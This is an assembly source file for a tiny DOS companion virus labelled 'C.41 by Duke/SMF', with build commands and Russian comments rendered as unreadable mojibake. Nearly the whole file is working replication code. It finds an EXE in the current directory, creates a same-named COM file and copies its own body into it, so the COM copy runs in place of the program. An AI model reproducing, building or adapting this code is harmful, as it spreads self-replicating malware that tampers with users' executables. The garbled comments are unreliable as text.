   ;*ë«®  : C.41 by Duke/SMF  (22.05.99)
   ;‘â «® : C.40 by Duke/SMF

   ;…á«¨ ¢ â¥ªãé¥¬ ª â «®£¥ ¥áâì EXE-ä ©« (¯¥à¢ë©, ¥á«¨ ¨å ¬®£®),
   ;¨ ã ¥£® ¥â ®¤®¨¬¥®£® COM, â® ¯®à §¨¬ (á®§¤ ¤¨¬ COM) ¨ ®â¢ «¨¬.
   ;“¯à ¢«¥¨ï ¥ ¢®§¢à é ¥¬, ¨ç¥àâ  ¥ ¯à®¢¥àï¥¬ :)
   ; tasm comp40.asm /m
   ; tlink comp40.obj /t

   ;*  íâ®â à § ï ®âá¥ª ¥é¥ ®¤ã ª®¬ ¤ã - ª ª ¨ áâà ®, ¯à®¤®«¦ ¥â à ¡®â âì :)

   .Model Tiny
   .code
   .386
   org 100h
   start:
   E_Mask db '*.e*'
          mov  di,9eh
          xchg cx,ax              ;cx=0
          mov  ah,4eh

          CALL NewFile

   NewFile:
          push si
          pop dx                  ;       mov dx,si
          int 21h

   ;TestFile:
          mov dx,di
          mov ax,5b2eh
   @1:
          scasb
          jne @1
          mov dword ptr [di],' moc'
          int 21h
   ;       jc @Exit               ;ª®£¤  ¯à¨¤¥â ¢à¥¬ï ¢á¥ à ¢® á ¬¨ ¢ë©¤¥¬ ;-))
          xchg bx,ax
          mov ah,40h
          mov cl,MyLength
   ;@Exit:
          ret
   ;---
   MyLength equ $-start
   end start
